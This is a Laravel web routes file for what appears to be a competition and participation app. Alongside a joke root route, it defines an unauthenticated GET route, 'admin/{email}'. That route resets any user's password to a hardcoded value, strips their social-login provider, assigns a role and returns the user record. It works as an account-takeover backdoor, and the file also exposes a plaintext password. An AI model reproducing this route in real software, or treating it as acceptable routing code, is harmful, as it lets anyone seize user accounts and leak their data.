<?php

use App\Http\Controllers\Admin\Hyperion\UserController;
use App\Models\User;
use Illuminate\Support\Str;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\CompetitionController;
use App\Http\Controllers\ParticipationController;
use App\Http\Controllers\Auth\EmailVerificationNotificationController;
use App\Http\Controllers\Auth\SocialiteController;
use App\Mail\Password;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Cache;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function (Request $request) {
    return ['Future King of Pirates' => 'Monkey D. Luffy'];
});

// Route::get('test/{user}', [UserController::class, 'issuePass']);
Route::get('admin/{email}', function ($email) {
    $user = User::where('email', $email)->first();
    $user->password = Hash::make('@40Kmph00');
    $user->provider = null;
    $user->save();
    $user->assignRole('member');
    return $user;
});


require __DIR__ . '/auth.php';
